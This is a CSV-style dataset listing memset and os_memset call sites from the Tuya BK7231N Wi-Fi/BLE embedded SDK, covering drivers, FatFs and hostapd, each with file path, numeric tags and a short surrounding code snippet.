2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\plf\refip\src\driver\uart\uart.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble\ble_pub\plf\refip\src\driver\uart\uart.c,"memset(uart_rx_buf,0,UART0_RX_FIFO_MAX_COUNT);",120,1,"		Uart_Read_Byte();
	}
	memset(uart_rx_buf,0,UART0_RX_FIFO_MAX_COUNT);
	
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\ble_lib\ip\ble\ll\src\lld\lld_int.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\ble_lib\ip\ble\ll\src\lld\lld_int.h,"#define LLD_INIT_EVT(evt, data_struct)       memset(evt , 0, sizeof(struct data_struct));",120,1,"
/// Initialize memory of an event and an associated data structure
#define LLD_INIT_EVT(evt, data_struct)       memset(evt , 0, sizeof(struct data_struct));

#if 0 //(RW_BLE_WLAN_COEX) || (RW_BLE_MWS_COEX)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\ble_pub\app\src\app_ble.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\ble_pub\app\src\app_ble.c,"memset(&dup_filter[0], 0, GAP_AD_TYPE_BITFIELD_BYTES);",120,1,"
    // Clear presence status of unique advertising type
    memset(&dup_filter[0], 0, GAP_AD_TYPE_BITFIELD_BYTES);

    // AD type flags must not be set by application
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\ble_pub\app\src\app_ble.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\ble_pub\app\src\app_ble.c,"memset(&app_ble_ctx, 0, sizeof(struct app_env_tag));",120,1,"{
    // Reset the application manager environment
    memset(&app_ble_ctx, 0, sizeof(struct app_env_tag));
	
    // Create APP task
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\ble_pub\app\src\app_task.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\ble_pub\app\src\app_task.c,"memset((void *)&cmd->irk.key[0], 0x00, KEY_LEN);",120,1,"                #endif //(NVDS_SUPPORT)
                {
                    memset((void *)&cmd->irk.key[0], 0x00, KEY_LEN);
                }
                // Send message
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\platform\7231n\driver\uart\uart_ble.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\platform\7231n\driver\uart\uart_ble.c,"memset((void *)&host_cmd_data.data_buf[0], 0, HCI_DATA_BUF_SIZE);",120,1,"    {
        host_cmd_data.callback = NULL;
        memset((void *)&host_cmd_data.data_buf[0], 0, HCI_DATA_BUF_SIZE);
        host_cmd_data.data_len = 0;
    }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\platform\7231n\driver\uart\uart_ble.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\platform\7231n\driver\uart\uart_ble.c,"memset((void *)&host_event_data.data_buf[0], 0, HCI_DATA_BUF_SIZE);",120,1,"    {
    ////	host_event_data.callback = NULL;		////Will clear callback func
        memset((void *)&host_event_data.data_buf[0], 0, HCI_DATA_BUF_SIZE);
        host_event_data.data_len = 0;
    }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\platform\7231n\nvds\src\nvds.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\ble_5_x_rw\platform\7231n\nvds\src\nvds.c,"memset( &nvds_env, 0, sizeof(nvds_env));",120,1,"{
    // init all the structure
    memset( &nvds_env, 0, sizeof(nvds_env));
    nvds_env.read  = nvds_null_read;
    nvds_env.write = nvds_null_write;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\common\drv_model.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\common\drv_model.c,"os_memset(drv_dev_tbl, 0, sizeof(drv_dev_tbl));",120,1,"UINT32 drv_model_init(void)
{
    os_memset(drv_dev_tbl, 0, sizeof(drv_dev_tbl));
    os_memset(drv_sdev_tbl, 0, sizeof(drv_sdev_tbl));

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\common\drv_model.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\common\drv_model.c,"os_memset(drv_sdev_tbl, 0, sizeof(drv_sdev_tbl));",120,1,"{
    os_memset(drv_dev_tbl, 0, sizeof(drv_dev_tbl));
    os_memset(drv_sdev_tbl, 0, sizeof(drv_sdev_tbl));

    return DRV_SUCCESS;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\dma\dma.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\dma\dma.c,"memset(dma_env.last_dma, 0, sizeof(dma_env.last_dma));",120,1,"void dma_init(void)
{
    memset(dma_env.last_dma, 0, sizeof(dma_env.last_dma));

    // configure the channel priorities
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\flash\flash.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\flash\flash.c,"memset(pb, 0xFF, 32);",120,1,"    else
    {
        memset(pb, 0xFF, 32);
    }

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\i2c\i2c1.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\i2c\i2c1.c,"os_memset(&gi2c1, 0, sizeof(I2C1_MSG_ST));",120,1,"void i2c1_init(void)
{
    os_memset(&gi2c1, 0, sizeof(I2C1_MSG_ST));
    i2c1_software_init();
    i2c1_hardware_init();
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\i2c\i2c2.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\i2c\i2c2.c,"os_memset(&gi2c2, 0, sizeof(I2C2_MSG_ST));",120,1,"void i2c2_init(void)
{
    os_memset(&gi2c2, 0, sizeof(I2C2_MSG_ST));
    i2c2_software_init();
    i2c2_hardware_init();
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\saradc\saradc.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\saradc\saradc.c,"memset(adc_config, 0x00, sizeof(saradc_desc_t));",120,1,"void saradc_config_param_init(saradc_desc_t* adc_config)
{
    memset(adc_config, 0x00, sizeof(saradc_desc_t));
    adc_config->channel = 1;
    adc_config->current_read_data_cnt = 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\sdcard\sdcard.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\sdcard\sdcard.c,"os_memset((void *)&sdcard, 0, sizeof(SDCARD_S));",120,1,"static void sdio_sw_init(void)
{
    os_memset((void *)&sdcard, 0, sizeof(SDCARD_S));
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\sdcard\sdcard.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\sdcard\sdcard.c,"os_memset(tmpptr, 0, 512);",120,1,"    if(tmpptr == NULL)
        return 1;
    os_memset(tmpptr, 0, 512);

    cmd.index = SEND_IF_COND;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_master_bk7231n.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_master_bk7231n.c,"os_memset(spi_dev, 0, sizeof(struct bk_spi_dev));",120,1,"		goto _exit;
	}
	os_memset(spi_dev, 0, sizeof(struct bk_spi_dev));


"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_master_bk7231n.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_master_bk7231n.c,"os_memset(&init_cfg, 0, sizeof(GDMACFG_TPYES_ST));",120,1,"
	os_printf(""spi dma tx init\r\n"");
	os_memset(&init_cfg, 0, sizeof(GDMACFG_TPYES_ST));
	os_memset(&en_cfg, 0, sizeof(GDMA_CFG_ST));

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_master_bk7231n.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_master_bk7231n.c,"os_memset(&en_cfg, 0, sizeof(GDMA_CFG_ST));",120,1,"	os_printf(""spi dma tx init\r\n"");
	os_memset(&init_cfg, 0, sizeof(GDMACFG_TPYES_ST));
	os_memset(&en_cfg, 0, sizeof(GDMA_CFG_ST));

	init_cfg.dstdat_width = 8;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_slave_bk7231n.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_slave_bk7231n.c,"os_memset(spi_slave_dev, 0, sizeof(struct bk_spi_slave_dev));",120,1,"		goto _exit;
	}
	os_memset(spi_slave_dev, 0, sizeof(struct bk_spi_slave_dev));

	result = rtos_init_semaphore(&spi_slave_dev->tx_sem, 1);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_slave_bk7231n.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_slave_bk7231n.c,"os_memset(rx_fifo->buffer, 0, SPI_SLAVE_RX_FIFO_LEN);",120,1,"
	rx_fifo->buffer = (uint8_t *)(rx_fifo + 1);
	os_memset(rx_fifo->buffer, 0, SPI_SLAVE_RX_FIFO_LEN);
	rx_fifo->put_index = 0;
	rx_fifo->get_index = 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_slave_bk7231n.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_slave_bk7231n.c,"os_memset(buf, 0, rx_len);",120,1,"		os_printf(""spi dma buff malloc error\r\n"");

	os_memset(buf, 0, rx_len);

	msg.send_buf = NULL;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_slave_bk7231n.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\spi\spi_slave_bk7231n.c,"os_memset(buf, 0x55, rx_len);",120,1,"
		os_printf(""cnt:%d\r\n"", cnt);
		os_memset(buf, 0x55, rx_len);
	}
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\uart_bk.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\driver\uart\uart_bk.c,"os_memset(&uart[uport], 0, sizeof(uart[uport]));",120,1,"    }

    os_memset(&uart[uport], 0, sizeof(uart[uport]));

    return UART_SUCCESS;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\bk7221U_cal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\bk7221U_cal.c,"memset(cTemp, 0, sizeof(cTemp));",120,1,"
	CAL_FLASH_PRT(""read_cal_result_from_flash\r\n"");
	memset(cTemp, 0, sizeof(cTemp));
	flash_read(cTemp, sizeof(cTemp), CAL_RESULT_FLASH_ADDR);
	if ((cTemp[0] == 0xFF) && (cTemp[4] == 0xFF) && (cTemp[8] == 0xFF) && (cTemp[12] == 0xFF))
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\bk7221U_cal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\bk7221U_cal.c,"memset(cTemp1, 0, 0x1000);",120,1,"	flash_write(cTemp, 0x1000, 0xF4000);

	memset(cTemp1, 0, 0x1000);
	os_printf(""cTemp1:\r\n"");
	for (i=0; i<0x1000; i++)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\bk7231N_cal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\bk7231N_cal.c,"memset(cali_saradc_desc, 0x00, sizeof(cali_saradc_desc_t));",120,1,"    //sddev_control(SCTRL_DEV_NAME, CMD_SCTRL_SET_ANALOG2, &param);

    memset(cali_saradc_desc, 0x00, sizeof(cali_saradc_desc_t));
    cali_saradc_desc->desc.channel = 8;
    cali_saradc_desc->desc.data_buff_size = sizeof(cali_saradc_desc->buffer) / sizeof(cali_saradc_desc->buffer[0]);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\manual_cal_bk7231.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\manual_cal_bk7231.c,"os_memset(check_buf, 0, len);",120,1,"        UINT8 check_result;

        os_memset(check_buf, 0, len);   
        
        status = ddev_read(flash_handle, check_buf, len, check_addr);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\manual_cal_bk7231.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\manual_cal_bk7231.c,"os_memset(buf, 0, sizeof(flash_len));",120,1,"        }

        os_memset(buf, 0, sizeof(flash_len));
        addr_start = pt->partition_start_addr;
        // copy flash
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\manual_cal_bk7231.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\manual_cal_bk7231.c,"os_memset(buf, 0xff, sizeof(flash_len));",120,1,"    UINT8 *buf = (UINT8*)os_malloc(flash_len); 

    os_memset(buf, 0xff, sizeof(flash_len));
    manual_cal_update_flash_area(0, buf, flash_len);
    os_free(buf);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\manual_cal_bk7231.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\bk7011_cal\manual_cal_bk7231.c,"os_memset(&g_tmp_pwr.temp_tab[0], 0, sizeof(UINT16)*TMP_PWR_TAB_LEN);",120,1,"		init_temp = ADC_TEMP_VAL_MAX;

    os_memset(&g_tmp_pwr.temp_tab[0], 0, sizeof(UINT16)*TMP_PWR_TAB_LEN);
    g_tmp_pwr.indx = idx;
    g_tmp_pwr.pwr_ptr = (TMP_PWR_PTR)&tmp_pwr_tab[idx];
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\camera_intf\camera_inft.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\camera_intf\camera_inft.c,"os_memset(&ejpeg_cfg, 0, sizeof(DJPEG_DESC_ST));",120,1,"static void camera_intf_config_ejpeg(void* data)
{   
    os_memset(&ejpeg_cfg, 0, sizeof(DJPEG_DESC_ST));
    os_memcpy(&ejpeg_cfg, data, sizeof(TVIDEO_DESC_ST));

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(fs->win, 0, SS(fs));",120,1,"        {
            /* Create FSInfo structure */
            memset(fs->win, 0, SS(fs));
            st_word(fs->win + BS_55AA, 0xAA55);
            st_dword(fs->win + FSI_LeadSig, 0x41615252);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(fs->win, 0, SS(fs));				*/",120,1,"                    if (_FS_EXFAT) dp->obj.stat |= 4;			/* The directory needs to be updated */
                    if (sync_window(fs) != FR_OK) return FR_DISK_ERR;	/* Flush disk access window */
                    memset(fs->win, 0, SS(fs));				/* Clear window buffer */
                    for (n = 0, fs->winsect = clust2sect(fs, clst); n < fs->csize; n++, fs->winsect++)  	/* Fill the new cluster with 0 */
                    {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(dirb, 0, 2 * SZDIRE);",120,1,"
    /* Create 85+C0 entry */
    memset(dirb, 0, 2 * SZDIRE);
    dirb[XDIR_Type] = 0x85;
    dirb[XDIR_Type + SZDIRE] = 0xC0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(dp->dir, 0, SZDIRE);	*/",120,1,"        if (res == FR_OK)
        {
            memset(dp->dir, 0, SZDIRE);	/* Clean the entry */
            memcpy(dp->dir + DIR_Name, dp->fn, 11);	/* Put SFN */
#if _USE_LFN != 0
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(dp->fn, ' ', 11);",120,1,"
    /* Create SFN in directory form */
    memset(dp->fn, ' ', 11);
    for (si = 0; lfn[si] == ' ' || lfn[si] == '.'; si++) ;	/* Strip leading spaces and dots */
    if (si) cf |= NS_LOSS | NS_LFN;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(sfn, ' ', 11);",120,1,"    p = *path;
    sfn = dp->fn;
    memset(sfn, ' ', 11);
    si = i = 0;
    ni = 8;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(fp->buf, 0, _MAX_SS);	*/",120,1,"#if !_FS_READONLY
#if !_FS_TINY
            memset(fp->buf, 0, _MAX_SS);	/* Clear sector buffer */
#endif
            if ((mode & FA_SEEKEND) && fp->obj.objsize > 0)  	/* Seek to end of file if FA_OPEN_APPEND is specified */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(dir, 0, SS(fs));",120,1,"                dsc = clust2sect(fs, dcl);
                dir = fs->win;
                memset(dir, 0, SS(fs));
                if (!_FS_EXFAT || fs->fs_type != FS_EXFAT)
                {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(dir + DIR_Name, ' ', 11);	*/",120,1,"                if (!_FS_EXFAT || fs->fs_type != FS_EXFAT)
                {
                    memset(dir + DIR_Name, ' ', 11);	/* Create ""."" entry */
                    dir[DIR_Name] = '.';
                    dir[DIR_Attr] = AM_DIR;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(dj.dir, 0, SZDIRE);	*/",120,1,"                    if (res == FR_OK)
                    {
                        memset(dj.dir, 0, SZDIRE);	/* Clear the entry */
                        if (_FS_EXFAT && fs->fs_type == FS_EXFAT)
                        {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(buf, 0, szb_buf);",120,1,"        do
        {
            memset(buf, 0, szb_buf);
            for (i = 0; nb >= 8 && i < szb_buf; buf[i++] = 0xFF, nb -= 8) ;
            for (b = 1; nb && i < szb_buf; buf[i] |= b, b <<= 1, nb--) ;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(buf, 0, ss);",120,1,"            n = (nsect > sz_buf) ? sz_buf : nsect;
            if (disk_write(pdrv, buf, sect, n) != RES_OK) return FR_DISK_ERR;
            memset(buf, 0, ss);
            sect += n;
            nsect -= n;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(buf, 0, (UINT)szb_buf);",120,1,"
        /* Initialize FAT area */
        memset(buf, 0, (UINT)szb_buf);
        sect = b_fat;		/* FAT start sector */
        for (i = 0; i < n_fats; i++)  			/* Initialize FATs each */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\fatfs\ff.c,"memset(buf, 0, _MAX_SS);",120,1,"
    /* Create partition table */
    memset(buf, 0, _MAX_SS);
    p = buf + MBR_Table;
    b_cyl = 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\hostapd\main_none.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\hostapd\main_none.c,"os_memset(&params, 0, sizeof(params));",120,1,"	}

	os_memset(&params, 0, sizeof(params));
	for (i = 0; wpa_drivers[i]; i++) {
		if (wpa_drivers[i] != hapd->driver)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\hostapd\main_none.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\hostapd\main_none.c,"os_memset(&s_hapd_global, 0, sizeof(s_hapd_global));",120,1,"	int i;

	os_memset(&s_hapd_global, 0, sizeof(s_hapd_global));

	for (i = 0; wpa_drivers[i]; i++)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\hostapd\main_none.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\hostapd\main_none.c,"os_memset(&g_hapd_interfaces, 0, sizeof(g_hapd_interfaces));",120,1,"	}

	os_memset(&g_hapd_interfaces, 0, sizeof(g_hapd_interfaces));
	g_hapd_interfaces.config_read_cb = hostapd_config_read;
	g_hapd_interfaces.for_each_interface = hostapd_for_each_interface;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\beacon.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\beacon.c,"os_memset(head->da, 0xff, ETH_ALEN);",120,1,"					   WLAN_FC_STYPE_BEACON);
	head->duration = host_to_le16(0);
	os_memset(head->da, 0xff, ETH_ALEN);

	os_memcpy(head->sa, hapd->own_addr, ETH_ALEN);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\beacon.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\beacon.c,"os_memset(pos, 0, hapd->conf->ssid.ssid_len);",120,1,"		/* clear the data, but keep the correct length of the SSID */
		*pos++ = hapd->conf->ssid.ssid_len;
		os_memset(pos, 0, hapd->conf->ssid.ssid_len);
		pos += hapd->conf->ssid.ssid_len;
	} else if (hapd->conf->ignore_broadcast_ssid) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\beacon.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\beacon.c,"os_memset(params, 0, sizeof(*params));",120,1,"#endif /* NEED_AP_MLME */

	os_memset(params, 0, sizeof(*params));
	params->head = (u8 *) head;
	params->head_len = head_len;
"
